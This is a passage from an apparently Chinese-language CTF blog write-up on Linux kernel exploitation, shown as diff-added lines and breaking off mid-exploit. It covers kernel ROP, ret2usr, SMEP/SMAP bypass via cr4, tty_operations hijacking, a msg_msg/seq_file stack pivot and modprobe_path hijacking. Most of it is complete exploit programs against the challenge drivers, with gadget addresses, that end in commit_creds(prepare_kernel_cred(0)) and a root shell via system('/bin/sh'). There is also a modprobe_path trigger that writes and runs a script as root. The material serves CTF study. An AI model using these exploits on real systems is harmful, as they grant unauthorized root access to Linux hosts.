+	size_t swapgs_popfq =  0xffffffff81a012da; // swapgs; popfq; ret;
+	size_t iretq  =  0xffffffff81050ac2; // iretq; ret;
+	int idx = 0;
+	for(idx=0;idx&lt;10;idx++)
+		name[idx] = canary;
+	name[idx++] = pop_rdi + offset;
+	name[idx++] = 0;
+	name[idx++] = prepare_kernel_cred;
+	name[idx++] = pop_rcx + offset;
+	name[idx++] = commit_creds;
+	name[idx++] = mov_rdi_rax_jmp_rcx + offset;
+	name[idx++] = swapgs_popfq + offset;
+	name[idx++] = 0;
+	name[idx++] = iretq + offset;
+	name[idx++] = (size_t)get_root_shell; //rip
+	name[idx++] = u_cs;
+	name[idx++] = u_rflags;
+	name[idx++] = u_rsp;
+	name[idx++] = u_ss;
+	write(fd, name, 0x800);
+	puts(&quot;[+] rop loaded.&quot;);
+	ioctl(fd, 0x6677889a, (0xffffffffffff0100));
+}
+int main(){
+	save_status();
+	int fd = open(&quot;/proc/core&quot;, O_RDWR);
+	size_t canary = leak_canary(fd);
+	printf(&quot;[+] canary: 0x%lx\n&quot;, canary);
+	size_t vmlinux_base = leak_vmlinux_base();
+	if(!vmlinux_base){
+		printf(&quot;[-] leak base failed.\n&quot;);
+		exit(-1);
+	}
+	size_t vmlinux_base_no_pie = 0xffffffff81000000;
+	size_t offset = vmlinux_base - vmlinux_base_no_pie;
+	printf(&quot;[+] offset: 0x%lx\n&quot;, offset);
+	rop(fd, canary, offset);
+	return 0;
+}
+</code></pre>
+<h2 id="smep-ret2usr">SMEP &amp; ret2usr</h2>
+<h3 id="再看core">再看core</h3>
+<p>之前使用kernel rop的方法打下来了core这道题。但其实，默认情况下，虽然内核态的函数在用户空间下是无法运行的，但用户态的函数在内核空间却可以运行，因此我们可以在用户空间构造好<code>commit_creds(prepare_kernel_cred(0))</code>，然后在内核空间以<code>ring 0</code>权限来运行它。</p>
+<p>利用这一点，可以对core的exp作出局部调整：</p>
+<ul>
+<li>加入<code>get_root</code>函数</li>
+</ul>
+<pre><code class="language-c">void get_root(){
+	void* (*cc)(char *) = commit_creds;
+	char* (*pkc)(int) = prepare_kernel_cred;
+	(*cc)((*pkc)(0)); // commit_creds(prepare_kernel_cred(0));
+}
+</code></pre>
+<ul>
+<li>修改rop</li>
+</ul>
+<pre><code class="language-c">for(idx=0;idx&lt;10;idx++)
+	name[idx] = canary;
+/*
+name[idx++] = pop_rdi + offset;
+name[idx++] = 0;
+name[idx++] = prepare_kernel_cred;
+name[idx++] = pop_rcx + offset;
+name[idx++] = commit_creds;
+name[idx++] = mov_rdi_rax_jmp_rcx + offset;
+*/
+name[idx++] = (size_t)get_root;
+name[idx++] = swapgs_popfq + offset;
+name[idx++] = 0;
+name[idx++] = iretq + offset;
+name[idx++] = (size_t)get_root_shell; //rip
+name[idx++] = u_cs;
+name[idx++] = u_rflags;
+name[idx++] = u_rsp;
+name[idx++] = u_ss;
+</code></pre>
+<p>仍然可以成功提权。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/05/77d36b4a3969e.png" alt="1657007842316.png" loading="lazy"></figure>
+<p>(不过此方法在不久之后出现KPTI页表隔离保护之后就完全没法利用了，<del>懒人落泪</del>)</p>
+<h3 id="smep-smap">SMEP &amp; SMAP</h3>
+<h4 id="introduction">Introduction</h4>
+<p>smep保护使得内核态也不能执行内核空间的代码了，因此直接ret2usr会失败。</p>
+<p>（与之相近的保护机制是smap，他能让内核空间无法直接访问用户空间的数据）</p>
+<p>不过是否开启smep保护是记录在<code>cr4</code>寄存器上的。</p>
+<p><code>cr4</code>寄存器的第20位为<code>1</code>时SMEP就视为开启，为<code>0</code>则视为关闭。</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/07/05/a0ce8cef963b0.png" alt="1657008988963.png" loading="lazy"></figure>
+<h4 id="bypass">Bypass</h4>
+<p>既然知道了判断是否开启smep的机制，那么bypass思路也很清晰了。只需要利用某些gadgets来修改cr4寄存器的值即可。（通常改成0x6f0，同时关闭smep和smap。不过控制cr4的gadgets在高版本无了）</p>
+<h3 id="resolve-babydriver-hijack-tty_operation-ret2usr">REsolve: babydriver (hijack tty_operation + ret2usr)</h3>
+<h4 id="分析-3">分析</h4>
+<p>这里用ret2usr的方法再解决一遍babydriver这道题。</p>
+<p>查看<code>boot.sh</code>，发现开启了smep。</p>
+<pre><code>qemu-system-x86_64 \
+	-initrd rootfs.cpio \
+	-kernel bzImage \
+	-append 'console=ttyS0 root=/dev/ram nopti oops=panic panic=1' \
+	-enable-kvm -monitor /dev/null -m 256M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
+</code></pre>
+<p>所以我们需要用rop来关闭smep，然后再ret2usr提权。</p>
+<p>可是这道题的洞是uaf，如何达成rop的目的呢？这里就需要用到<code>tty_struct</code>和<code>tty_operation</code>这两个结构体了。</p>
+<p>他们的原型分别如下：</p>
+<pre><code class="language-c">struct tty_struct {
+    int magic;
+    struct kref kref;
+    struct device *dev;
+    struct tty_driver *driver;
+    const struct tty_operations *ops;
+    int index;
+    /* Protects ldisc changes: Lock tty not pty */
+    struct ld_semaphore ldisc_sem;
+    struct tty_ldisc *ldisc;
+    struct mutex atomic_write_lock;
+    struct mutex legacy_mutex;
+    struct mutex throttle_mutex;
+    struct rw_semaphore termios_rwsem;
+    struct mutex winsize_mutex;
+    spinlock_t ctrl_lock;
+    spinlock_t flow_lock;
+    /* Termios values are protected by the termios rwsem */
+    struct ktermios termios, termios_locked;
+    struct termiox *termiox;    /* May be NULL for unsupported */
+    char name[64];
+    struct pid *pgrp;       /* Protected by ctrl lock */
+    struct pid *session;
+    unsigned long flags;
+    int count;
+    struct winsize winsize;     /* winsize_mutex */
+    unsigned long stopped:1,    /* flow_lock */
+              flow_stopped:1,
+              unused:BITS_PER_LONG - 2;
+    int hw_stopped;
+    unsigned long ctrl_status:8,    /* ctrl_lock */
+              packet:1,
+              unused_ctrl:BITS_PER_LONG - 9;
+    unsigned int receive_room;  /* Bytes free for queue */
+    int flow_change;
+    struct tty_struct *link;
+    struct fasync_struct *fasync;
+    wait_queue_head_t write_wait;
+    wait_queue_head_t read_wait;
+    struct work_struct hangup_work;
+    void *disc_data;
+    void *driver_data;
+    spinlock_t files_lock;      /* protects tty_files list */
+    struct list_head tty_files;
+#define N_TTY_BUF_SIZE 4096
+    int closing;
+    unsigned char *write_buf;
+    int write_cnt;
+    /* If the tty has a pending do_SAK, queue it here - akpm */
+    struct work_struct SAK_work;
+    struct tty_port *port;
+} __randomize_layout;
+</code></pre>
+<pre><code class="language-c">struct tty_operations {
+    struct tty_struct * (*lookup)(struct tty_driver *driver,
+            struct file *filp, int idx);
+    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+    int  (*open)(struct tty_struct * tty, struct file * filp);
+    void (*close)(struct tty_struct * tty, struct file * filp);
+    void (*shutdown)(struct tty_struct *tty);
+    void (*cleanup)(struct tty_struct *tty);
+    int  (*write)(struct tty_struct * tty,
+              const unsigned char *buf, int count);
+    int  (*put_char)(struct tty_struct *tty, unsigned char ch);
+    void (*flush_chars)(struct tty_struct *tty);
+    int  (*write_room)(struct tty_struct *tty);
+    int  (*chars_in_buffer)(struct tty_struct *tty);
+    int  (*ioctl)(struct tty_struct *tty,
+            unsigned int cmd, unsigned long arg);
+    long (*compat_ioctl)(struct tty_struct *tty,
+                 unsigned int cmd, unsigned long arg);
+    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
+    void (*throttle)(struct tty_struct * tty);
+    void (*unthrottle)(struct tty_struct * tty);
+    void (*stop)(struct tty_struct *tty);
+    void (*start)(struct tty_struct *tty);
+    void (*hangup)(struct tty_struct *tty);
+    int (*break_ctl)(struct tty_struct *tty, int state);
+    void (*flush_buffer)(struct tty_struct *tty);
+    void (*set_ldisc)(struct tty_struct *tty);
+    void (*wait_until_sent)(struct tty_struct *tty, int timeout);
+    void (*send_xchar)(struct tty_struct *tty, char ch);
+    int (*tiocmget)(struct tty_struct *tty);
+    int (*tiocmset)(struct tty_struct *tty,
+            unsigned int set, unsigned int clear);
+    int (*resize)(struct tty_struct *tty, struct winsize *ws);
+    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
+    int (*get_icount)(struct tty_struct *tty,
+                struct serial_icounter_struct *icount);
+    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
+#ifdef CONFIG_CONSOLE_POLL
+    int (*poll_init)(struct tty_driver *driver, int line, char *options);
+    int (*poll_get_char)(struct tty_driver *driver, int line);
+    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
+#endif
+    int (*proc_show)(struct seq_file *, void *);
+} __randomize_layout;
+</code></pre>
+<p>在<code>tty_struct</code>中有<code>const struct tty_operations *ops;</code></p>
+<p>因此如果可以伪造出一个<code>tty_struct</code>，使它的<code>*ops</code>指向一个伪造出来的<code>tty_operation</code>，即可利用<code>write</code>和<code>ioctl</code>这些函数来劫持程序执行流程。</p>
+<p>由于不熟悉结构体，我这里是先把tty_operation的内容布置成了比较有规律的样子，然后利用报错计算偏移</p>
+<pre><code class="language-c">size_t fake_tty_operation[0x20] = {
+    			0xffffffff00000000,
+				0xffffffff00000001,
+				0xffffffff00000002,
+				0xffffffff00000003,
+				0xffffffff00000004,
+				0xffffffff00000005,
+				0xffffffff00000006,
+				0xffffffff00000007,
+				0xffffffff00000008,
+				0xffffffff00000009,
+				0xffffffff0000000a,
+				0xffffffff0000000b,
+				0xffffffff0000000c
+};
+</code></pre>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/10/17/390168f94bb72.png" alt="1665991784472.png" loading="lazy"></figure>
+<p>一闪而过的报错中，可以看出来babywrite是被劫持到了<code>tty_operation[7]</code>这个位置，所以直接从这里开始劫持控制流。（后面发现，只要在启动脚本中加一句<code>-no-reboot</code>就不用担心看不见报错了，泪目）</p>
+<p>想要完成内核rop，此时肯定需要控制一下rsp的位置，有一个比较好用的gadget：</p>
+<pre><code class="language-assembly">0xffffffff8181bfc5: mov rsp, rax; dec ebx; jmp 0xffffffff8181bf7e;
+0xffffffff8181bf7e: ret;
+</code></pre>
+<p>经过调试，发现此时rax的值刚好是这个<code>tty_operation</code>结构体的首地址</p>
+<p>所以此时有两个思路：</p>
+<pre><code>1. 复用一次0xffffffff8181bfc5这里的gadget，把rsp劫持到用户态的rop那里去
+2. 直接在tty_operation里rop，但是要注意一下绕过tty_operation[7]
+</code></pre>
+<p>不管用哪个，最终都能成功劫持程序流完成ret2usr。（由于一些原因，我还是选择了第二种方式）</p>
+<p>不过有一个问题，使用这题原生的内核版本4.4.72会出现<code>PANIC: double fault, error_code: 0x0</code>这样的报错，<del>所以需要换内核版本运行，这里就不过多讨论了。</del></p>
+<p>查了一些资料过后，发现很可能是<code>PTI</code>保护机制的问题，在尝试关闭<code>PTI</code>无果之后，发现其实可以通过对特定<code>signal</code>的处理来继续完成利用，比如说<code>PTI</code>机制这里会抛出的11号信号，给他处理成<code>get_root_shell</code>这个函数就行了，因为在这之前已经完成了bypass smep和<code>prepare_kernel_cred(commit_creds(0))</code>的操作。</p>
+<p>（本来想用<code>swapgs_restore_regs_and_return_to_usermode</code>的，不过这个题内核版本太老了，貌似还并没有引进这个函数）</p>
+<h4 id="exp-3">exp</h4>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;stdlib.h&gt;
+#include&lt;string.h&gt;
+#include&lt;unistd.h&gt;
+#include&lt;fcntl.h&gt;
+#include&lt;sys/stat.h&gt;
+#include&lt;sys/types.h&gt;
+#include&lt;sys/ioctl.h&gt;
+
+size_t usr_cs, usr_rflags, usr_rsp, usr_ss;
+void save_status(){
+	__asm__(&quot;mov usr_cs, cs;&quot;
+		&quot;pushf;&quot;
+		&quot;pop usr_rflags;&quot;
+		&quot;mov usr_rsp, rsp;&quot;
+		&quot;mov usr_ss, ss;&quot;
+	);
+}
+void get_root(){
+	char* (*pkc)(int) = 0xffffffff810a1810; // prepare_kernel_cred;
+	void* (*cc)(char*) = 0xffffffff810a1420; // commit_creds;
+	(*cc)((*pkc)(0));
+}
+void get_root_shell(){
+	if(getuid()!=0){
+		puts(&quot;[-] get root failed.&quot;);
+		exit(-1);
+	}
+	system(&quot;/bin/sh&quot;);
+}
+int main(){
+	save_status();
+	signal(11, (size_t)get_root_shell);
+	
+	int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);
+	int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);
+	ioctl(fd1, 0x10001, 0x2e0);
+	close(fd1);  // uaf
+	size_t rop[0x30] = {0};
+	int i = 0;
+	rop[i++] = 0xffffffff810d238d; // pop rdi; ret;
+	rop[i++] = 0x6f0; // bypass smep
+	rop[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;
+	rop[i++] = 0;
+	rop[i++] = (size_t)get_root;  // ret2usr
+	rop[i++] = 0xffffffff81063694; // swapgs; pop rbp; ret;
+	rop[i++] = 0;
+	rop[i++] = 0xffffffff814e35ef; // iretq; ret;
+	rop[i++] = (size_t)get_root_shell; // rip
+	rop[i++] = usr_cs;
+	rop[i++] = usr_rflags;
+	rop[i++] = usr_rsp;
+	rop[i++] = usr_ss;
+
+	int fd3 = open(&quot;/dev/ptmx&quot;, O_RDWR|O_NOCTTY);
+	size_t fake_tty_operation[0x20] = {
+        			0xffffffff00000000,
+					0xffffffff00000001,
+					0xffffffff00000002,
+					0xffffffff00000003,
+					0xffffffff00000004,
+					0xffffffff00000005,
+					0xffffffff00000006,
+					0xffffffff00000007,
+					0xffffffff00000008,
+					0xffffffff00000009,
+					0xffffffff0000000a,
+					0xffffffff0000000b,
+					0xffffffff0000000c
+    		};
+	/*
+	fake_tty_operation[0] = 0xffffffff8100ce6e; // pop rax; ret;
+	fake_tty_operation[1] = rop[0];
+	for(int j=2;j&lt;5;j++)
+		fake_tty_operation[j] = 0xffffffff8100ce6f; // ret;
+	fake_tty_operation[5] = 0xffffffff8105c144;  // pop rbx; ret;
+	fake_tty_operation[6] = 0xffff880006f31c00;
+	*/
+	for(int j=0;j&lt;5;j++)
+		fake_tty_operation[j] = rop[j];
+	fake_tty_operation[5] = 0xffffffff8100ce6f; // ret;
+	for(int j=6;j&lt;14;j++)
+		fake_tty_operation[j] = rop[j-1];
+	
+	fake_tty_operation[7] = 0xffffffff8181bfc5; // mov rsp, rax; dec ebx; ret;
+
+	size_t fake_tty_struct[4] = {0};
+	read(fd2, fake_tty_struct, 32);
+	fake_tty_struct[3] = (size_t)fake_tty_operation; // hijack *ops
+	write(fd2, fake_tty_struct, 32);
+
+	char buf[0x10] = {0};
+	write(fd3, buf, 0x8);  // tty_operation -&gt; write
+	return 0;
+}
+</code></pre>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/12/26/f32c94bfdb173.png" alt="1672035607644.png" loading="lazy"></figure>
+<h3 id="re-resolve-babydriver-msg_msg-seq_file-pt_regs-ret2usr">RE: REsolve: babydriver (msg_msg + seq_file + pt_regs + ret2usr)</h3>
+<h4 id="分析-4">分析</h4>
+<p>大多数情况下，smep和smap都是同时出现的，那么之前那个攻击方式就有欠缺了些许味道（毕竟伪造的tty_operation还是位于用户态，所以并不能抗住smap这个机制）</p>
+<p>所以我又脑子一热，将启动脚本修改如下（加入了smap）</p>
+<pre><code class="language-sh">qemu-system-x86_64 \
+	-initrd rootfs.cpio \
+	-kernel bzImage \
+	-append 'console=ttyS0 root=/dev/ram nopti oops=panic panic=1' \
+	-enable-kvm -monitor /dev/null -m 256M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep,+smap \
+	-no-reboot \
+	-s
+</code></pre>
+<p>思路其实和之前差不多，利用某些方式劫持到程序流之后栈迁到rop就行，只不过rop需要想办法构造在DMA区域中了。</p>
+<p>为了学习尽可能多的trick，我使用了一种比较曲折的方式来达成利用（（（（</p>
+<p>过程可以大致分为以下几步：</p>
+<ul>
+<li>利用本题漏洞，造一个0x1000大小的uaf，开一个0x1100的<code>msg_msg</code>结构体（前0x1000的<code>msg_msg</code>内容任意，后面挂着的0x100的<code>msg_msgseg</code>用于布置rop），利用uaf leak出<code>msg_msg</code>中指向<code>msg_msgseg</code>的指针，得到rop地址。</li>
+<li>再造一个0x18大小的uaf，打开<code>/proc/self/stat</code>创建出<code>seq_file</code>，uaf捕获到<code>seq_operations</code>。这样就能利用<code>read(seq_fd, $rsp, 8)</code>触发<code>seq_operations-&gt;start</code>指针的任意执行了。</li>
+<li>先使用<code>add rsp, val</code>这类gadgets来让rsp走到<code>pt_regs</code>中，从而再利用<code>pop rsp; ret</code>这样的gadget实现栈迁移（由于没有找到合适的一次性把rsp add到pt_regs的gadget，所以在exp使用了二段跳）</li>
+</ul>
+<h4 id="exp-4">exp</h4>
+<pre><code class="language-c">#define _GNU_SOURCE
+#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;linux/keyctl.h&gt;
+
+#include &lt;sys/shm.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/syscall.h&gt;
+
+#include &lt;errno.h&gt;
+
+int dev_fd[2], seq_fd;
+const char *dev_name = &quot;/dev/babydev&quot;;
+
+size_t commit_creds = 0xffffffff810a1420;
+size_t prepare_kernel_cred = 0xffffffff810a1810;
+size_t rop_addr;
+
+size_t usr_cs, usr_rflags, usr_rsp, usr_ss;
+void save_status()
+{
+	__asm__(
+		&quot;mov usr_cs, cs;&quot;
+		&quot;pushf;&quot;
+		&quot;pop usr_rflags;&quot;
+		&quot;mov usr_rsp, rsp;&quot;
+		&quot;mov usr_ss, ss;&quot;
+	);
+}
+
+void get_root()
+{
+	char* (*pkc)(int) = prepare_kernel_cred;
+	void* (*cc)(char*) = commit_creds;
+	(*cc)((*pkc)(0));
+}
+
+void get_root_shell()
+{
+	if (getuid()!=0) {
+		puts(&quot;[-] get root failed.&quot;);
+		exit(-1);
+	}
+	system(&quot;/bin/sh&quot;);
+}
+
+void build_rop(size_t *rop, int offset)
+{
+	int i = offset;
+	rop[i++] = 0xffffffff810d238d; // pop rdi; ret;
+	rop[i++] = 0x6f0; // bypass smep&amp;smap
+	rop[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;
+	rop[i++] = 0;
+	rop[i++] = (size_t)get_root;  // ret2usr
+	rop[i++] = 0xffffffff81063694; // swapgs; pop rbp; ret;
+	rop[i++] = ((size_t)&amp;i);
+	rop[i++] = 0xffffffff814e35ef; // iretq; ret;
+	rop[i++] = (size_t)get_root_shell; // rip
+	rop[i++] = usr_cs;
+	rop[i++] = usr_rflags;
+	rop[i++] = usr_rsp;
+	rop[i++] = usr_ss;
+}
+
+int getMsgQueue(void)
+{
+    return msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+}
+
+int readMsg(int msqid, void *msgp, size_t msgsz, long msgtyp)
+{
+    return msgrcv(msqid, msgp, msgsz, msgtyp, IPC_NOWAIT|MSG_NOERROR);
+}
+
+int writeMsg(int msqid, void *msgp, size_t msgsz)
+{
+    return msgsnd(msqid, msgp, msgsz, 0);
+}
+
+int main()
+{
+	save_status();
+	signal(11, (size_t)get_root_shell);
+
+	int qid = getMsgQueue();
+	if (qid == -1) {
+		fprintf(stderr, &quot;[-] msg_queue\n&quot;);
+		exit(-1);
+	}
+	
+	dev_fd[0] = open(dev_name, O_RDWR);
+	if (dev_fd[0] == -1) {
+		fprintf(stderr, &quot;[-] open %s failed.(1)\n&quot;, dev_name);
+		exit(-1);
+	}
+	
+	dev_fd[1] = open(dev_name, O_RDWR);
+	if (dev_fd[1] == -1) {
+		fprintf(stderr, &quot;[-] open %s failed.(2)\n&quot;, dev_name);
+		exit(-1);
+	}
+	
+	char *buffer_send = malloc(0x4000);
+	char *buffer_recv = malloc(0x4000);
+	memset(buffer_send, 0x61, 0x4000);
+	
+	build_rop((size_t *)buffer_send, ((0x1000-0x30)&gt;&gt;3)+1);
+	
+	ioctl(dev_fd[0], 0x10001, 0x1000);
+	close(dev_fd[0]);
+	
+	int cnt = 1;
+	for (int i = 0; i &lt; cnt; ++i) {
+		if (writeMsg(qid, buffer_send, 0x1100-0x38) &lt; 0)
+			fprintf(stderr, &quot;[-] msg_msg\n&quot;);
+		else
+			puts(&quot;[+] msg_msg\n&quot;);
+	}
+	
+	
+	read(dev_fd[1], buffer_recv, 0x40);
+	puts(&quot;\nPartial leak:&quot;);
+	for (int i = 0; i &lt; 8; ) {
+		printf(&quot;[+] %016lx %016lx\n&quot;, ((size_t *)buffer_recv)[i], ((size_t *)buffer_recv)[i+1]);
+		i += 2;
+	}
+	rop_addr = ((size_t *)buffer_recv)[4] + 0x8;
+	printf(&quot;[+] rop_addr: 0x%lx\n&quot;, rop_addr);
+	printf(&quot;[+] buffer_send: 0x%lx\n&quot;, buffer_send);
+	
+	dev_fd[0] = open(dev_name, O_RDWR);
+	if (dev_fd[0] == -1) {
+		fprintf(stderr, &quot;[-] open %s failed.(3)\n&quot;, dev_name);
+		exit(-1);
+	}
+	ioctl(dev_fd[0], 0x10001, 0x18);
+	close(dev_fd[0]);
+
+	seq_fd = open(&quot;/proc/self/stat&quot;, O_RDONLY);
+	if (seq_fd == -1) {
+		puts(&quot;[-] failed in opening seq_fd.&quot;);
+		exit(-1);
+	}
+	
+	// getchar();
+	
+	size_t ptr = 0xffffffff8151a3a5;  // add rsp, 0x148; pop rbx; pop r12; pop r13; pop rbp; ret;
+	write(dev_fd[1], (char *)&amp;ptr, 0x8);
+
+	__asm__(
+		&quot;mov r15,   0xffffffff8100006f;&quot;  // ret;
+       	&quot;mov r14,   0xffffffff81183478;&quot;  // add rsp, 0x40; pop rbx; pop rbp; ret;
+       	&quot;mov r13,   0xffffffff8100006f;&quot;
+       	&quot;mov r12,   0xffffffff8100006f;&quot;
+       	&quot;mov rbp,   0xffffffff8100006f;&quot;
+       	&quot;mov rbx,   0xffffffff8100006f;&quot;
+       	&quot;mov r11,   0xffffffff8100006f;&quot;
+       	&quot;mov r10,   0xffffffff8100006f;&quot;
+       	&quot;mov r9,    0xffffffff81171045;&quot;  // pop rsp; ret;
+       	&quot;mov r8,    rop_addr;&quot;
+       	&quot;xor rax,   rax;&quot;
+       	&quot;xor rdi,   rdi;&quot;
+       	&quot;mov rcx,   0xdeadbeef;&quot;
+       	&quot;mov rdx,   8;&quot;
+       	&quot;mov rsi,   rsp;&quot;
+       	&quot;mov rdi,   seq_fd;&quot;
+       	&quot;syscall&quot;			   // read(seq_fd, $rsp, 8);
+	);
+
+	// getchar();
+
+	return 0;
+}
+</code></pre>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/03/08/ba29638f00a76.png" alt="11.png" loading="lazy"></figure>
+<h2 id="hijack-modprobe_path">Hijack modprobe_path</h2>
+<p>他和<code>poweroff_cmd</code>, <code>uevent_helper</code>, <code>ocfs2_hb_ctl_path</code>, <code>nfs_cache_getent_prog</code>, <code>cltrack_prog</code>这些变量类似，都是<code>call_usermodehelper</code>类型的trick。</p>
+<p>只需要劫持一个字符串，就能用root权限执行任意命令（但是这个命令往往是不可以交互的）</p>
+<p>以<code>modprobe_path</code>为例在劫持了对应字符串为<code>/tmp/a.sh</code>之后，只需要运行一个非正确的ELF文件即可触发</p>
+<pre><code class="language-c">system(&quot;echo -ne '\\xff\\xff\\xff\\xff' &gt;&gt; /tmp/dummy&quot;);
+system(&quot;echo '#!/bin/sh\nchmod 777 /flag' &gt;&gt; /tmp/a.sh&quot;);
+system(&quot;chmod 777 /tmp/dummy; chmod 777 /tmp/a.sh&quot;);
+	
+system(&quot;/tmp/dummy&quot;);
+</code></pre>
+<h3 id="rwontheheap">rwOnTheHeap</h3>
+<h4 id="分析-5">分析</h4>
+<p>checksec只开了NX</p>
+<p>关键函数如下，</p>
+<pre><code class="language-c">__int64 procfile_open()
+{
+  _QWORD *v0; // rax
+
+  _fentry__();
+  v0 = (_QWORD *)kmem_cache_alloc_trace(kmalloc_caches[10], 3264LL, 1024LL);
+  *v0 = v0;
+  procfs_buffer = (__int64)v0;
+  return _x86_return_thunk(0LL, 0LL, 0LL);
+}
+
+__int64 __fastcall procfile_write(__int64 a1, __int64 a2)
+{
+  _fentry__();
+  if ( !copy_from_user(&amp;request_t, a2, 16LL) )
+    *(_QWORD *)(procfs_buffer + *(&amp;request_t + 1)) = request_t;
+  return _x86_return_thunk(0LL, 0LL, 0LL);
+}
+
+__int64 __fastcall procfile_read(__int64 a1, __int64 a2)
+{
+  _fentry__();
+  if ( !copy_from_user(&amp;request_t, a2, 16LL) )
+  {
+    request_t = *(_QWORD *)(procfs_buffer + *(&amp;request_t + 1));
+    copy_to_user(a2, &amp;request_t, 16LL);
+  }
+  return _x86_return_thunk(0LL, 0LL, 0LL);
+}
+</code></pre>
+<p>非常直观的dma中越界读写漏洞（值得一提的是，越界的地址范围多达8字节，这已经可以任意位置读写了）</p>
+<p>不难想到，只需要leak出kernel的text段地址即可直接越界修改<code>modprobe_path</code>达成利用。</p>
+<p>在leak的时候我使用的方法是</p>
+<ul>
+<li>构造若干个<code>msg_msg</code>和<code>msg_msgseg</code>，在一个<code>msg_queue</code>上挂着0x400的<code>msg_msg</code>，指向0x1000的<code>msg_msg</code>，再指向0x20的<code>msg_msgseg</code>。然后再开一个<code>shm_file_data</code>（0x20）。</li>
+<li>通过越界读，在<code>procfs_buffer</code>附近4个内存页中搜索0x400的<code>msg_msg</code>，从他的双链表找到0x1000的<code>msg_msg</code>的位置，再通过0x1000的<code>msg_msg</code> leak出0x20的<code>msg_msgseg</code>的地址。</li>
+<li>这时就又能通过越界读，在0x20的msg_msgseg附近的3个内存页中搜索到<code>shm_file_data</code>，从而得到kernel的text段地址，计算出<code>modprobe_path</code>的位置，达成利用。</li>
+</ul>
+<h4 id="exp-5">exp</h4>
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/stat.h&gt;
+
+#include &lt;sys/shm.h&gt;
+#include &lt;sys/msg.h&gt;
+#include &lt;sys/ipc.h&gt;
+#include &lt;sys/syscall.h&gt;
+
+size_t buf[2];
+
+int fd1, fd2;
+
+void read_from_heap(int fd, size_t offset) {
+	buf[1] = offset;
+	read(fd, buf, 0x10);
+}
+
+void write_to_heap(int fd, size_t value, size_t offset) {
+	buf[0] = value;
+	buf[1] = offset;
+	write(fd, buf, offset);
+}
+
+int main() {
+	fd1 = open(&quot;/proc/vuln&quot;, O_RDWR);
+	if(fd1 == -1) {
+		printf(&quot;[-] open device error.\n&quot;);
+		exit(-1);
+	}
+	printf(&quot;[+] fd: %d\n&quot;, fd1);
+	
+	read_from_heap(fd1, 0);
+	uint64_t procfs_buffer = buf[0];
+	printf(&quot;[+] buffer addr: %lx\n&quot;, procfs_buffer);
+	
+	
+	char *buffer = malloc(0x4000);
+	memset(buffer, 0x61, 0x400);
+	int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+	msgsnd(qid, buffer, 0x400-0x30, 0);
+	
+	memset(buffer, 0x62, 0x2000);
+	msgsnd(qid, buffer, 0x1020-0x38, 0);  // 0x1000 + 0x20
+	
+	int shmid = shmget(IPC_PRIVATE, 100, 0600); // 0x20 -&gt; shm_file_data -&gt; leak
+	if(shmid == -1) {
+		puts(&quot;[-] shmget error!&quot;);
+		exit(-1);
+	}
+	char *shaddr = shmat(shmid, NULL, 0);
+	if(shaddr == (void *)-1) {
+		puts(&quot;[-] shmattr error!&quot;);
+		exit(-1);
+	}
+
+	// search msg_msg (0x400) in recent 4 pages
+	int cur = -0x2000, tail = 0x2000;
+	uint64_t msg_msg_1024 = 0;
+	for(; cur &lt;= tail; cur+=0x10) {
+		read_from_heap(fd1, cur);
+		//printf(&quot;%016lx %016lx\n&quot;, buf[0], buf[1]);
+		if(buf[0]==0x6161616161616161) {
+			read_from_heap(fd1, cur-0x10);
+			msg_msg_1024 = buf[0];
+			
+			printf(&quot;[+] msg_msg_1024: %lx\n&quot;, msg_msg_1024);
+			break;
+		}
+	}
+	if(!msg_msg_1024) {
+		puts(&quot;[-] failed in searching msg_msg_1024&quot;);
+		exit(-1);
+	}
+
+	read_from_heap(fd1, msg_msg_1024 + 0x20 - procfs_buffer);
+	uint64_t msg_msgseg = buf[0];
+	printf(&quot;[+] msg_msgseg: %lx\n&quot;, msg_msgseg);
+	
+	// search shm_file_data in recent 3 pages
+	cur = msg_msgseg - procfs_buffer - 0x1008, tail = cur + 0x2008;
+	uint64_t leak_kernel_addr = 0;
+	for(; cur &lt;= tail; cur+=0x10) {
+		read_from_heap(fd1, cur);
+		//printf(&quot;[+] %016lx\n&quot;, buf[0]);
+		if(buf[0]&gt;0xffffffff00000000) {
+			leak_kernel_addr = buf[0];
+			
+			printf(&quot;[+] leak_kernel_addr: %lx\n&quot;, leak_kernel_addr);
+			break;
+		}
+	}
+	if(!leak_kernel_addr) {
+		puts(&quot;[-] failed in searching leak&quot;);
+		exit(-1);
+	}
+
+	uint64_t modprobe_path = leak_kernel_addr - 0x1da1a0;
